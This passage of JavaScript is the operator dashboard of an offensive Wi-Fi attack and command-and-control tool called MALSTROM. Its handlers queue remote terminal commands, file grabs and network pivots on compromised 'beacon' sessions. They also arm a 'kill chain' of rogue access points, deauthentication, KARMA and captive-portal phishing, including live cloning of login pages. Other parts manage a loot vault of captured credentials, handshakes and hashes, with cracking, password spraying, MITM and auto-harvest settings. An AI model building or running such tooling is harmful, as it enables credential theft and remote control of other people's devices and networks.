      if (r.ok) { toast('File grab queued to ' + sid); $('sess-file').value = ''; opsPoll(); }
      else toast('Grab failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-file').addEventListener('click', sendSessFile);
  $('sess-file').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessFile(); });

  // C5: terminal / file browser / pivot -----------------------------------------
  function sendTermCmd() {
    var sid = $('sess-select').value || sessSel;
    var cmd = $('sess-term-cmd').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!cmd) { toast('Type a command', true); return; }
    apiGet('beacon_termcmd', { sid: sid, cmd: cmd }).then(function (r) {
      if (r.ok) { $('sess-term-cmd').value = ''; opsPoll(); }
      else toast('Queue failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-term-cmd').addEventListener('click', sendTermCmd);
  $('sess-term-cmd').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendTermCmd(); });
  $('cfg-term').addEventListener('change', function () {
    var sid = $('sess-select').value || sessSel;
    if (!sid) { toast('No session selected', true); this.checked = false; return; }
    apiGet('beacon_term', { sid: sid, on: this.checked ? '1' : '0' }).then(function (r) {
      if (r.ok) { toast('Terminal ' + (r.on ? 'on' : 'off')); opsPoll(); }
      else toast('Toggle failed: ' + (r.error || '?'), true);
    });
  });
  function sendSessLs() {
    var sid = $('sess-select').value || sessSel;
    var path = $('sess-ls-path').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!path) { toast('Enter a path', true); return; }
    apiGet('beacon_ls', { sid: sid, path: path }).then(function (r) {
      if (r.ok) { toast('Listing queued: ' + path); opsPoll(); }
      else toast('List failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-ls').addEventListener('click', sendSessLs);
  $('sess-ls-path').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessLs(); });
  function sendSessFw() {
    var sid = $('sess-select').value || sessSel;
    var spec = $('sess-fw').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!spec) { toast('Enter a spec like 8080-192.168.1.50:80', true); return; }
    apiGet('beacon_fwd', { sid: sid, spec: spec }).then(function (r) {
      if (r.ok) { $('sess-fw').value = ''; toast('Pivot queued to ' + sid); opsPoll(); }
      else toast('Pivot failed: ' + (r.error || '?'), true);
    });
  }
  $('btn-sess-fw').addEventListener('click', sendSessFw);
  $('sess-fw').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessFw(); });

  // --- SSE log stream ---------------------------------------------------------
  function openStream() {
    var es = new EventSource(API + '?action=events&token=' + (session.sid || ''));
    es.onmessage = function (ev) {
      var line;
      try { line = JSON.parse(ev.data); } catch (e) { return; }
      appendLog(line);
    };
    es.onerror = function () {
      es.close();
      setTimeout(openStream, 2500);
    };
  }

  function appendLog(line) {
    var box = $('log-stream');
    var ph = box.querySelector('.empty');
    if (ph) box.removeChild(ph);
    var lg = line.line ? JSON.parse(line.line) : line;
    var t = lg.ts || '';
    var m = lg.msg || '';
    var type = lg.type || 'INFO';
    var div = document.createElement('div');
    div.className = 'logline ' + type;
    div.innerHTML = '<span class="t">[' + t + ']</span> <span class="m"></span>';
    div.querySelector('.m').textContent = m;
    box.appendChild(div);
    while (box.childNodes.length > 300) box.removeChild(box.firstChild);
    box.scrollTop = box.scrollHeight;
    if (type === 'ALERT') {
      $('nav-alerts').textContent = '!';
      toast('ALERT: ' + m, true);
    }
    if (type === 'CRED' || type === 'HANDSHAKE' || type === 'PMKID' ||
        type === 'VERIFY' || type === 'CRACK') { lootPoll(); alertsPoll(); }
    if (type === 'OWNED' || type === 'HASH' || type === 'SCAN' || type === 'MITM' || type === 'PROG' || type === 'SESS') { opsPoll(); }
  }

  // --- settings ---------------------------------------------------------------
  function renderSettings(s) {
    if (!s || !s.ok) return;
    $('set-lan-url').value = s.lan_url || '';
    $('set-token').value = s.token || '';
    $('set-key').value = s.key || '';
    setCheck('set-auth-gate', !!s.auth_enabled);
    $('set-auth-hint').textContent = s.auth_enabled
      ? 'Token-gated — sign-in required (new sessions need the dashboard password)'
      : 'Open — anyone can open the dashboard (auth gate off, no restart needed)';
    if (s.settings) {
      $('set-beacon-int').value = s.settings.beacon_interval;
      $('set-beacon-maxout').value = s.settings.beacon_maxout;
      $('set-scan-range').value = s.settings.scan_range;
      $('set-spray-limit').value = s.settings.spray_limit;
      $('set-mitm-iface').value = s.settings.mitm_iface;
      $('set-wlan-dev').value = s.settings.wlan_dev || '';
      $('set-crack-wordlist').value = s.settings.crack_wordlist || '';
      $('set-portal-ssid').value = s.settings.portal_ssid || '';
    }
    var rows = [];
    if (s.runtime) {
      rows.push(['MALSTROM version', s.runtime.version]);
      rows.push(['State dir', s.runtime.state_dir]);
      rows.push(['Loot dir', s.runtime.loot_dir]);
      rows.push(['Nmap binary', s.runtime.scan_bin]);
      rows.push(['NetExec binary', s.runtime.netexec_bin]);
      rows.push(['Responder binary', s.runtime.responder_bin]);
    }
    if (s.portal_ip) rows.push(['Rogue portal', s.portal_ip + ':' + s.portal_port]);
    var tb = $('tbl-runtime').querySelector('tbody');
    tb.innerHTML = rows.map(function (r) {
      return '<tr><td>' + esc(r[0]) + '</td><td><code>' + esc(r[1]) + '</code></td></tr>';
    }).join('') || '<tr><td colspan="2" class="empty">n/a</td></tr>';
  }

  function pollSettings() {
    apiGet('settings').then(renderSettings);
  }

  $('btn-copy-token').addEventListener('click', function () {
    var t = $('set-token').value;
    if (!t) { toast('No password set', true); return; }
    copyText(t);
  });

  $('btn-rotate-key').addEventListener('click', function () {
    if (!confirm('Rotate the beacon key? Agents with the old key will be orphaned.')) return;
    apiGet('key_rotate').then(function (s) {
      if (s.ok) {
        $('set-key').value = s.key;
        $('set-key-msg').textContent = 'Rotated — serve fresh payloads to existing sessions.';
        opsPoll();
      } else {
        toast('Rotation failed: ' + (s.error || '?'), true);
      }
    });
  });

  // A pending (unsaved) gate flip must survive the 6.5s settings poll — mark
  // it dirty until SAVE applies server truth; the save handler clears it.
  $('set-auth-gate').addEventListener('change', function () {
    markDirty('set-auth-gate');
  });

  $('btn-save-settings').addEventListener('click', function () {
    var params = {};
    var fields = ['beacon_interval', 'beacon_maxout', 'scan_range', 'spray_limit', 'mitm_iface', 'wlan_dev', 'crack_wordlist'];
    $('set-save-msg').textContent = '';
    ['set-beacon-int', 'set-beacon-maxout', 'set-scan-range', 'set-spray-limit', 'set-mitm-iface', 'set-wlan-dev', 'set-crack-wordlist'].forEach(function (id, i) {
      if ($(id).value.trim() !== '') params[fields[i]] = $(id).value.trim();
    });
    params.portal_ssid = $('set-portal-ssid').value.trim();
    params.auth_enabled = $('set-auth-gate').checked ? '1' : '0';
    apiGet('settings_set', params).then(function (s) {
      if (s.ok) {
        toast('Settings saved');
        $('set-save-msg').textContent = 'Saved.';
        if (s.settings) {
          $('set-portal-ssid').value = s.settings.portal_ssid || '';
          $('set-beacon-int').value = s.settings.beacon_interval;
          $('set-beacon-maxout').value = s.settings.beacon_maxout;
          $('set-scan-range').value = s.settings.scan_range;
          $('set-spray-limit').value = s.settings.spray_limit;
          $('set-mitm-iface').value = s.settings.mitm_iface;
          $('set-wlan-dev').value = s.settings.wlan_dev || '';
          $('set-crack-wordlist').value = s.settings.crack_wordlist || '';
        }
        if (typeof s.auth_enabled !== 'undefined') {
          delete dirty['set-auth-gate'];
          setCheck('set-auth-gate', !!s.auth_enabled);
          $('set-auth-hint').textContent = s.auth_enabled
            ? 'Token-gated — sign-in required (new sessions need the dashboard password)'
            : 'Open — anyone can open the dashboard (auth gate off, no restart needed)';
          if (s.auth_enabled) {
            // Enabling the gate wipes every session server-side — including
            // ours. Show the login screen immediately instead of leaving a
            // dead dashboard that just toasts 'auth required' every poll.
            showAuthGate('Auth gate ENABLED — your session was closed. '
                       + 'Re-enter the dashboard password to continue.');
          }
        }
      } else {
        $('set-save-msg').textContent = (s.error || 'failed');
        toast('Save failed: ' + (s.error || '?'), true);
      }
    });
  });

  // --- actions ----------------------------------------------------------------
  function start() {
    var params = {
      ssid: $('cfg-ssid').value.trim(),
      bssid: $('cfg-bssid').value.trim(),
      channel: $('cfg-channel').value || '6',
      portal_mode: $('cfg-portal-mode').value,
      psk: $('cfg-psk').value.trim(),
      clone_bssid: $('cfg-clone-bssid').checked ? '1' : '0',
      beacon_rotate: $('cfg-rotate').value || '0',
      ssid_cloak: $('cfg-cloak').checked ? '1' : '0',
      wpa3_transition: $('cfg-wpa3').checked ? '1' : '0',
      deauth_mode: $('cfg-deauth').value,
      burst: $('cfg-burst').value || '25',
      delay: $('cfg-delay').value || '1',
      continuous: $('cfg-continuous').checked ? '1' : '0',
      template: $('cfg-template').value,
      capture_mode: $('cfg-capture').value,
      karma: $('cfg-karma').checked ? '1' : '0',
      karma_respond: $('cfg-karma-respond').checked ? '1' : '0',
      relay: $('cfg-relay').checked ? '1' : '0',
      shield_after_capture: $('cfg-shield').checked ? '1' : '0'
    };
    if (!params.ssid) { toast('Specify a target SSID first', true); return; }
    apiGet('start', params).then(function (s) {
      if (s.ok) { toast('Kill chain armed: ' + params.ssid); dirty = {}; statusPoll(); }
      else toast('Arm failed: ' + (s.error || '?'), true);
    });
  }
  $('btn-start').addEventListener('click', start);

  $('btn-autopwn').addEventListener('click', function () {
    var on = !autopwn.auto_harvest;
    apiGet('autopwn', { on: on ? '1' : '0' }).then(function (r) {
      if (r && r.ok) {
        toast(on ? 'Auto harvest armed' : 'Auto harvest disarmed');
        statusPoll();
      } else {
        toast('Auto harvest toggle failed: ' + (r && r.error || '?'), true);
      }
    });
  });

  $('btn-disarm').addEventListener('click', function () {
    apiGet('disarm').then(function (s) {
      if (s.ok) { toast('Kill chain disarmed'); statusPoll(); }
      else toast('Disarm failed', true);
    });
  });

  $('btn-cleanup').addEventListener('click', function () {
    if (!confirm('Full cleanup? Restores your AP config, stops portal + deauth.')) return;
    apiGet('cleanup').then(function (s) {
      if (s.ok) { toast('Cleanup complete — original config restored'); statusPoll(); }
      else toast('Cleanup failed: ' + (s.error || '?'), true);
    });
  });

  $('btn-loot-clear').addEventListener('click', function () {
    if (!confirm('Clear all loot? Wipes captured creds, devices, handshakes, probes, hashes and pcaps on-device. Pinned items are kept.')) return;
    apiGet('loot_clear').then(function (s) {
      if (s.ok) { toast('Loot vault cleared'); lootPoll(); statusPoll(); }
      else toast('Clear failed: ' + (s.error || '?'), true);
    });
  });

  $('btn-whitelist-clear').addEventListener('click', function () {
    if (!confirm('Clear the whitelist? Every shielded client is served the portal again on its next request (already-connected ones right away, once the engine syncs the firewall).')) return;
    apiGet('whitelist_clear').then(function (s) {
      if (s.ok) { toast('Whitelist cleared — portal served to everyone again'); statusPoll(); }
      else toast('Clear failed: ' + (s.error || '?'), true);
    });
  });

  $('btn-reset-stock').addEventListener('click', function () {
    if (!confirm('Reset to stock? Clears scans, loot, target state and events. Keeps portal templates, whitelist, settings, pinned items and auth.')) return;
    apiGet('reset_stock').then(function (s) {
      if (s.ok) {
        toast('MALSTROM reset to stock — portals kept');
        $('reset-msg').textContent = 'Reset complete.';
        dirty = {};
        statusPoll();
        lootPoll();
        opsPoll();
        alertsPoll();
      } else {
        toast('Reset failed: ' + (s.error || '?'), true);
      }
    });
  });

  $('btn-reset-tool').addEventListener('click', function () {
    if (!confirm('Factory reset MALSTROM? Wipes loot, target state, whitelist, settings and custom templates. The dashboard password is kept.')) return;
    apiGet('reset').then(function (s) {
      if (s.ok) {
        toast('MALSTROM reset to factory defaults');
        $('reset-msg').textContent = 'Reset complete.';
        dirty = {};
        loadTemplates();
        statusPoll();
        lootPoll();
        opsPoll();
        alertsPoll();
      } else {
        toast('Reset failed: ' + (s.error || '?'), true);
      }
    });
  });

  $('btn-scan').addEventListener('click', function () {
    // The crude prompt() picker is gone — jump to the Recon tab and run a live
    // scan; USE a row there to load the target into this form.
    setView('recon');
    runWifiScan();
  });

  $('cfg-portal-mode').addEventListener('change', function () {
    var wpa = (this.value === 'wpa');
    $('psk-wrap').style.display = wpa ? '' : 'none';
    $('wpa3-wrap').style.display = wpa ? '' : 'none';
  });

  // templates + preview -------------------------------------------------------
  function loadTemplates() {
    apiGet('templates').then(function (t) {
      if (!t.ok) return;
      templates = t.templates || [];
      if (templates.indexOf('wifi_login') < 0) templates.unshift('wifi_login');
      var sel = $('cfg-template');
      var options = ['<option value="auto">Auto (OS-adaptive)</option>'];
      sel.innerHTML = options.concat(templates.map(function (n) {
        return '<option value="' + n + '">' + n + '</option>';
      })).join('');
    });
  }

  $('btn-preview').addEventListener('click', function () {
    var name = $('cfg-template').value || 'wifi_login';
    apiGet('template', { name: name === 'auto' ? 'wifi_login' : name }).then(function (t) {
      if (t.html) {
        $('modal-iframe').srcdoc = t.html;
        $('modal').classList.add('show');
      }
    });
  });
  $('modal-close').addEventListener('click', function () { $('modal').classList.remove('show'); });

  // template upload -------------------------------------------------------------
  $('btn-upload-tpl').addEventListener('click', function () {
    $('file-tpl').value = '';
    $('file-tpl').click();
  });
  $('file-tpl').addEventListener('change', function () {
    var f = this.files && this.files[0];
    if (!f) return;
    var reader = new FileReader();
    reader.onload = function () {
      var name = f.name.replace(/\.(html?|txt)$/i, '').trim() || 'custom';
      fetch(API + '?' + qs({ action: 'save_template', token: session.sid || '' }), {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: qs({ name: name, html: reader.result || '' })
      }).then(function (r) { return r.json(); }).then(function (s) {
        if (s.ok) { toast('Template "' + name + '" stored'); loadTemplates(); }
        else toast('Upload failed: ' + (s.error || '?'), true);
      });
    };
    reader.readAsText(f);
  });

  // live page clone ------------------------------------------------------------
  $('btn-clone-page').addEventListener('click', function () {
    var url = $('clone-url').value.trim();
    if (!url) { toast('Enter a URL to clone', true); return; }
    $('btn-clone-page').disabled = true;
    apiGet('clone_page', { url: url }).then(function (s) {
      $('btn-clone-page').disabled = false;
      if (s && s.ok) {
        toast('Cloned -> template "' + s.name + '" (activated)');
        loadTemplates();
      } else toast('Clone failed: ' + ((s && s.error) || '?'), true);
    });
  });

  // loot tabs + exports ----------------------------------------------------------
  document.querySelectorAll('.loot-tabs .tab').forEach(function (b) {
    b.addEventListener('click', function () {
      document.querySelectorAll('.loot-tabs .tab').forEach(function (x) { x.classList.toggle('active', x === b); });
      switchLootTab(b.getAttribute('data-tab'));
    });
  });

  $('btn-export-csv').addEventListener('click', function () {
    var url = API + '?' + qs({ action: 'export_csv', token: session.sid || '', kind: lootTab });
    downloadUrl(url, 'malstrom_' + lootTab + '.csv');
  });

  $('btn-export-json').addEventListener('click', function () {
    var blob = new Blob([JSON.stringify(loot.creds, null, 2)], { type: 'application/json' });
    downloadBlob(blob, 'malstrom_creds.json');
  });

  // --- boot -------------------------------------------------------------------
  function boot() {
    if (booted) return;
    booted = true;
    setView('dashboard');
    initChannelTooltip();
    initLineHovers();
    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey || e.metaKey || e.altKey) return;
      var t = e.target || {};
      var tag = String(t.tagName || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea' || tag === 'select' || t.isContentEditable) return;
      var idx = -1;
      if (e.key >= '1' && e.key <= '9') idx = Number(e.key) - 1;
      else if (e.key === '0') idx = 9;
      if (idx >= 0 && views[idx]) { e.preventDefault(); setView(views[idx]); }
    });
    updateClock();
    setInterval(updateClock, 1000);
    loadTemplates();
    statusPoll();
    lootPoll();
    opsPoll();
    alertsPoll();
    openStream();
    pollSettings();
    dashboardPoll();
    setInterval(statusPoll, 2500);
    setInterval(lootPoll, 4000);
    setInterval(opsPoll, 3500);
    setInterval(alertsPoll, 5000);
    setInterval(pollSettings, 6500);
    setInterval(dashboardPoll, 4000);
    setInterval(apLogPoll, 2500);
    apLogPoll();
    setInterval(radarPoll, 2000);
    // operator-presence heartbeat: the daemon in app mode (desktop icon) stops
    // itself once this stops arriving, i.e. when the dashboard is closed.
    setInterval(function () { apiGet('ping', {}); }, 15000);
  }
})();